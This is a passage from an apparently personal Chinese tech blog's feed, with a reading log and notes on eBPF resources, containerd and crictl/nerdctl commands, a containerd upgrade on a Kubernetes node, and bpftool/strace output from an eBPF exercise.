阅读器<br>阅读时间：2022.12.31-2023.02.02<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230216135833.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230216140233.png" alt="image.png"></p><h2 id="《谁动了我的奶酪》"><a href="#《谁动了我的奶酪》" class="headerlink" title="《谁动了我的奶酪》"></a>《谁动了我的奶酪》</h2><p>阅读方式：微信读书<br>阅读时间： 2023.02.16-2023.02.16</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230216140823.png" alt="image.png"></p><h2 id="《你今天真好看》"><a href="#《你今天真好看》" class="headerlink" title="《你今天真好看》"></a>《你今天真好看》</h2><p>阅读方式：微信读书<br>阅读时间： 2023.02.17</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/819b7fef85a38af88123e0ed52c3c56.jpg" alt="819b7fef85a38af88123e0ed52c3c56.jpg"></p><h2 id="《德米安-彷徨少年时》"><a href="#《德米安-彷徨少年时》" class="headerlink" title="《德米安-彷徨少年时》"></a>《德米安-彷徨少年时》</h2><p>阅读方式： 纸质书<br>阅读时间：2023.06.10-2023.06.11</p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/4d914420e783e7650e3ea8b783f87c4.jpg" width="50%" height="50%"><h2 id="《悉达多》"><a href="#《悉达多》" class="headerlink" title="《悉达多》"></a>《悉达多》</h2><p>阅读方式： 纸质书<br>阅读时间：2023.06.22-2023.06.28</p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/094db4f6d50607928e640ceb7a6b96b.jpg" width="50%" height="50%"><h2 id="《窗边的小豆豆》"><a href="#《窗边的小豆豆》" class="headerlink" title="《窗边的小豆豆》"></a>《窗边的小豆豆》</h2><p>阅读方式： 微信读书<br>阅读时间：2023.07.01 -&gt; 2023.07.06</p><h2 id="《硬派健身100问》"><a href="#《硬派健身100问》" class="headerlink" title="《硬派健身100问》"></a>《硬派健身100问》</h2><p>阅读方式： 纸质书<br>阅读时间： 2023.02.07  –&gt; </p><h2 id="《平凡的世界》"><a href="#《平凡的世界》" class="headerlink" title="《平凡的世界》"></a>《平凡的世界》</h2><p>2023.4.23</p>]]></content>
    
    
    <categories>
      
      <category>books</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】学习资料汇总</title>
    <link href="/2023/02/15/ebpf/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/"/>
    <url>/2023/02/15/ebpf/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bolipi.com/%EF%BC%8CeBPF%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99%E6%AD%A3%E5%9C%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD">https://www.bolipi.com/，eBPF学习网站正在建设中</a><br><a href="https://github.com/xdp-project/xdp-tutorial">https://github.com/xdp-project/xdp-tutorial</a> 这个上面资料和例子很多<br><a href="https://www.cnxct.com/ebpf-slide-pdf-share">https://www.cnxct.com/ebpf-slide-pdf-share</a> 这个博主整理的挺好</p><p>正在看内核之旅社区CCF编程夏令营学生的文档和代码，很适合入门<a href="https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem">https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem</a></p><p><a href="https://github.com/eunomia-bpf/bpf-developer-tutorial">https://github.com/eunomia-bpf/bpf-developer-tutorial</a></p><p>【ebpf网络加速相关资料】</p><ul><li><input disabled="" type="checkbox"> 利用 ebpf sockmap&#x2F;redirection 提升 socket 性能（2020） <a href="https://cloud.tencent.com/developer/article/1793155">https://cloud.tencent.com/developer/article/1793155</a></li><li><input disabled="" type="checkbox"> 图解eBPF socket level 重定向的内核实现细节   <a href="https://cloud.tencent.com/developer/article/2245006">https://cloud.tencent.com/developer/article/2245006</a>  </li><li><input disabled="" type="checkbox"> 图解Linux网络包接收过程   <a href="https://zhuanlan.zhihu.com/p/256428917">https://zhuanlan.zhihu.com/p/256428917</a></li><li><input disabled="" type="checkbox"> 内功修炼   <a href="https://github.com/yanfeizhang/coder-kung-fu">https://github.com/yanfeizhang/coder-kung-fu</a></li><li><input disabled="" type="checkbox"> ebpf 《ebpf之巅》 第10章 网络</li></ul><p>【同事推荐】</p><ul><li><input disabled="" type="checkbox"> ebpf  github handbook  <a href="https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md">https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】学习资料汇总</title>
    <link href="/2023/02/15/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/"/>
    <url>/2023/02/15/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bolipi.com/%EF%BC%8CeBPF%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99%E6%AD%A3%E5%9C%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD">https://www.bolipi.com/，eBPF学习网站正在建设中</a><br><a href="https://github.com/xdp-project/xdp-tutorial">https://github.com/xdp-project/xdp-tutorial</a> 这个上面资料和例子很多<br><a href="https://www.cnxct.com/ebpf-slide-pdf-share">https://www.cnxct.com/ebpf-slide-pdf-share</a> 这个博主整理的挺好</p><p>正在看内核之旅社区CCF编程夏令营学生的文档和代码，很适合入门<a href="https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem">https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem</a></p><p><a href="https://github.com/eunomia-bpf/bpf-developer-tutorial">https://github.com/eunomia-bpf/bpf-developer-tutorial</a></p><p>【ebpf网络加速相关资料】</p><ul><li><input disabled="" type="checkbox"> 利用 ebpf sockmap&#x2F;redirection 提升 socket 性能（2020） <a href="https://cloud.tencent.com/developer/article/1793155">https://cloud.tencent.com/developer/article/1793155</a></li><li><input disabled="" type="checkbox"> 图解eBPF socket level 重定向的内核实现细节   <a href="https://cloud.tencent.com/developer/article/2245006">https://cloud.tencent.com/developer/article/2245006</a>  </li><li><input disabled="" type="checkbox"> 图解Linux网络包接收过程   <a href="https://zhuanlan.zhihu.com/p/256428917">https://zhuanlan.zhihu.com/p/256428917</a></li><li><input disabled="" type="checkbox"> 内功修炼   <a href="https://github.com/yanfeizhang/coder-kung-fu">https://github.com/yanfeizhang/coder-kung-fu</a></li><li><input disabled="" type="checkbox"> ebpf 《ebpf之巅》 第10章 网络</li></ul><p>【同事推荐】</p><ul><li><input disabled="" type="checkbox"> ebpf  github handbook  <a href="https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md">https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【go语言系列】用go写一个prometheus exporter</title>
    <link href="/2023/02/08/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E7%94%A8go%E5%86%99%E4%B8%80%E4%B8%AAprometheus%20exporter/"/>
    <url>/2023/02/08/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E7%94%A8go%E5%86%99%E4%B8%80%E4%B8%AAprometheus%20exporter/</url>
    
    <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.51cto.com/luoguoling/5145886">用go写一个prometheus exporter</a></p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】vmware中安装windows虚拟机</title>
    <link href="/2023/02/08/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91vmware%E4%B8%AD%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2023/02/08/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91vmware%E4%B8%AD%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="下载windows镜像"><a href="#下载windows镜像" class="headerlink" title="下载windows镜像"></a>下载windows镜像</h2><p><a href="https://msdn.itellyou.cn/?lang=zh-cn">msdn</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230208094440.png" alt="image.png"></p><p>打开迅雷软件，会自动复制链接进行下载</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://blog.51cto.com/u_14289664/5133054">VMware Workstation Pro虚拟机安装Windows 10 系统</a></p><p>基本按照这个来的，只是虚拟磁盘那块选的是“拆分成多个文件”</p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202302)crictl、nerdctl命令</title>
    <link href="/2023/02/06/k8s/%E3%80%90containerd%E3%80%91(202302)crictl%E3%80%81nerdctl%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/02/06/k8s/%E3%80%90containerd%E3%80%91(202302)crictl%E3%80%81nerdctl%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crictl pods <span class="hljs-comment"># list pods - compare with kubectl get pods  </span><br>$ crictl inspectp <span class="hljs-comment"># inspect a pod (different from crictl inspect)  </span><br>$ crictl info <span class="hljs-comment"># view CRI runtime info  </span><br>$ crictl stats <span class="hljs-comment"># does everything look normal?  </span><br>$ crictl --debug stopp <span class="hljs-comment"># [sic] stop a pod and print debug logs (useful if a pod is stuck terminating)</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">功能\组件</th><th align="left">docker</th><th align="left">crictl</th><th align="left">nerdctl</th><th align="left">ctr</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td><td align="left">某个主机安装了 k8s 后，命令行才会有 crictl 命令</td><td align="left"></td><td align="left">ctr 是跟 k8s 无关的，主机安装了 containerd 服务后就可以操作 ctr 命令</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">crictl操作的均在k8s.io命名空间</td><td align="left"></td><td align="left">ctr客户端主要区分了3个命名空间，分别是k8s.io、moby和default</td></tr><tr><td align="left">查看镜像</td><td align="left"></td><td align="left">crictl images</td><td align="left"></td><td align="left">ctr image ls</td></tr><tr><td align="left">查看k8s的镜像</td><td align="left"></td><td align="left">crictl images list</td><td align="left">nerdctl images –namespace k8s.io<br>  nerdctl -n k8s.io images</td><td align="left">ctr -n&#x3D;k8s.io image list</td></tr><tr><td align="left">拉取镜像</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">ctr i pull –user admin:password –skip-verify &lt;YOUR REGISTRY&gt;&#x2F;app&#x2F;web1:latest</td></tr><tr><td align="left">删除镜像</td><td align="left">docker rmi</td><td align="left">crictl rmi</td><td align="left"></td><td align="left">ctr image rm</td></tr><tr><td align="left">列出所有容器</td><td align="left"></td><td align="left"></td><td align="left">nerdctl ps</td><td align="left"></td></tr><tr><td align="left">获取容器的详细信息</td><td align="left"></td><td align="left"></td><td align="left">nerdctl inspect xxx</td><td align="left"></td></tr><tr><td align="left">获取容器日志</td><td align="left"></td><td align="left"></td><td align="left">nerdctl logs -f xxx</td><td align="left"></td></tr><tr><td align="left">停止容器</td><td align="left"></td><td align="left"></td><td align="left">nerdctl stop xxx</td><td align="left"></td></tr><tr><td align="left">删除容器</td><td align="left"></td><td align="left"></td><td align="left">nerdctl rm xxx</td><td align="left"></td></tr><tr><td align="left">test</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><h2 id="crictl"><a href="#crictl" class="headerlink" title="crictl"></a>crictl</h2><p><code>/etc/containerd/config.toml</code>配置文件中的内容仅会对crictl生效。</p><p>在&#x2F;etc&#x2F;containerd&#x2F;config.toml 文件中添加需要加速的镜像信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.mirrors.<span class="hljs-string">&quot;k8s.gcr.io&quot;</span>]<br> endpoint = [<span class="hljs-string">&quot;https://registry.aliyuncs.com/k8sxio&quot;</span>]<br></code></pre></td></tr></table></figure><p>其中，<code>registry.mirrors.&quot;xxx&quot;</code>表示需要配置 mirror 的镜像仓库原镜像仓库，<code>endpoint</code>表示提供 mirror 的镜像加速服务。</p><h3 id="镜像验证"><a href="#镜像验证" class="headerlink" title="镜像验证"></a>镜像验证</h3><h4 id="tls验证"><a href="#tls验证" class="headerlink" title="tls验证"></a>tls验证</h4><p>跳过tls验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.configs.<span class="hljs-string">&quot;&lt;YOUR REGISTRY&gt;&quot;</span>.tls]<br>  insecure_skip_verify = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h4 id="用户验证"><a href="#用户验证" class="headerlink" title="用户验证"></a>用户验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.configs.<span class="hljs-string">&quot;&lt;YOUR REGISTRY&gt;&quot;</span>.auth]<br>  username = <span class="hljs-string">&quot;&lt;YOUR USERNAME&gt;&quot;</span><br>  password = <span class="hljs-string">&#x27;&lt;USERNAME PASSWORD&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>作者：橘子基因<br>链接：<a href="https://www.jianshu.com/p/07a2b4b74d63">https://www.jianshu.com/p/07a2b4b74d63</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p><a href="https://www.qikqiak.com/k8strain2/containerd/nerdctl/"># Containerd 高级命令行工具 nerdctl</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看本机containerd加载的插件</span><br>ctr plugin <span class="hljs-built_in">ls</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@cdp-10-191-193-5 ~]<span class="hljs-comment"># cd /run/containerd</span><br>[root@cdp-10-191-193-5 containerd]<span class="hljs-comment"># ll</span><br>总用量 0<br>srw-rw---- 1 root root     0 6月  24 11:43 containerd.sock<br>srw-rw---- 1 root root     0 6月  24 11:43 containerd.sock.ttrpc<br>drwxr-xr-x 4 root root    80 9月  19 2023 io.containerd.grpc.v1.cri<br>drwx--x--x 2 root root    40 9月  11 2023 io.containerd.runtime.v1.linux<br>drwx--x--x 3 root root    60 9月  19 2023 io.containerd.runtime.v2.task<br>drwx------ 3 root root    60 9月  19 2023 runc <span class="hljs-comment"># 容器的状态</span><br>drw------- 2 root root 46300 6月  25 22:31 s  <span class="hljs-comment"># containerd与shim通信的socker地址</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202302) 升级生产环境的containerd版本</title>
    <link href="/2023/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202302)%20%E5%8D%87%E7%BA%A7%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%9A%84containerd%E7%89%88%E6%9C%AC/"/>
    <url>/2023/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202302)%20%E5%8D%87%E7%BA%A7%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%9A%84containerd%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>1.驱逐pod</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">kubectl cordon node2</span><br><span class="hljs-comment">kubectl drain node2</span> <span class="hljs-literal">--</span><span class="hljs-comment">ignore</span><span class="hljs-literal">-</span><span class="hljs-comment">daemonsets</span> <span class="hljs-literal">--</span><span class="hljs-comment">delete</span><span class="hljs-literal">-</span><span class="hljs-comment">emptydir</span><span class="hljs-literal">-</span><span class="hljs-comment">data</span> <span class="hljs-literal">--</span><span class="hljs-comment">force</span><br><br></code></pre></td></tr></table></figure><p>2.替换containerd的二进制，重启containerd</p><p>3.删除containerd的数据目录，重启containerd</p><p>4.恢复node</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kubectl</span> uncordon node2<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">随时用下面命令进行测试：<br>crictl pods<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>4</title>
    <link href="/2023/01/29/ebpf/unsupported/04/"/>
    <url>/2023/01/29/ebpf/unsupported/04/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#### 04节</span><br><span class="hljs-comment">###### bpftool，用它可以查看 eBPF 程序的运行状态</span><br><span class="hljs-comment"># 查询系统中正在运行的 eBPF 程序</span><br>sudo bpftool prog list  <br><span class="hljs-comment"># 导出这个 eBPF 程序的指令</span><br>sudo bpftool prog dump xlated <span class="hljs-built_in">id</span> 89<br><br>sudo bpftool prog dump jited <span class="hljs-built_in">id</span> 89<br><br><br><span class="hljs-comment"># 跟踪系统调用 -ebpf表示只跟踪bpf系统调用</span><br>strace -v -f -ebpf ./hello-opennat.py<br><br>strace -v -f ./hello-opennat.py<br><br><br>用高级语言开发的 eBPF 程序，需要首先编译为 BPF 字节码（即 BPF 指令），然后借助 bpf 系统调用加载到内核中，最后再通过性能监控等接口，与具体的内核事件进行绑定。这样，内核的性能监控模块才会在内核事件发生时，自动执行我们开发的 eBPF 程序。<br><br><br></code></pre></td></tr></table></figure><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br></code></pre></td></tr></table></figure><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="BPF-指令是什么样的？"><a href="#BPF-指令是什么样的？" class="headerlink" title="BPF 指令是什么样的？"></a>BPF 指令是什么样的？</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog list</span><br>...<br>170: kprobe  name hello_world  tag 38dd440716c4900f  gpl<br>        loaded_at 2023-01-29T22:53:07+0800  uid 0<br>        xlated 104B  jited 74B  memlock 4096B<br>        btf_id 103<br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump xlated id 170</span><br>int hello_world(void * ctx):<br>; int hello_world(void *ctx)<br>   0: (b7) r1 = 33<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // 最常用的 BPF 辅助函数，它的作用是输出一段字符串。不过，由于 eBPF 运行在内核中，它的输出并不是通常的标准输出（stdout），而是内核调试文件 /sys/kernel/debug/tracing/trace_pipe<br>   1: (6b) *(u16 *)(r10 -4) = r1<br>   2: (b7) r1 = 1684828783<br>   3: (63) *(u32 *)(r10 -8) = r1<br>   4: (18) r1 = 0x57202c6f6c6c6548<br>   6: (7b) *(u64 *)(r10 -16) = r1<br>   7: (bf) r1 = r10<br>;<br>   8: (07) r1 += -16<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // 最常用的 BPF 辅助函数，它的作用是输出一段字符串。不过，由于 eBPF 运行在内核中，它的输出并不是通常的标准输出（stdout），而是内核调试文件 /sys/kernel/debug/tracing/trace_pipe<br>   9: (b7) r2 = 14<br>  10: (85) call bpf_trace_printk<span class="hljs-comment">#-65424</span><br>; <span class="hljs-built_in">return</span> 0;<br>  11: (b7) r0 = 0<br>  12: (95) <span class="hljs-built_in">exit</span><br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump jited id 170</span><br>Error: No libbfd support<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool version -p</span><br>&#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;5.15.74&quot;</span>,<br>    <span class="hljs-string">&quot;features&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;libbfd&quot;</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&quot;skeletons&quot;</span>: <span class="hljs-literal">false</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="eBPF-程序是什么时候执行的？"><a href="#eBPF-程序是什么时候执行的？" class="headerlink" title="eBPF 程序是什么时候执行的？"></a>eBPF 程序是什么时候执行的？</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>strace: <span class="hljs-built_in">exec</span>: Permission denied<br>+++ exited with 1 +++<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># chmod +x hello.py</span><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from 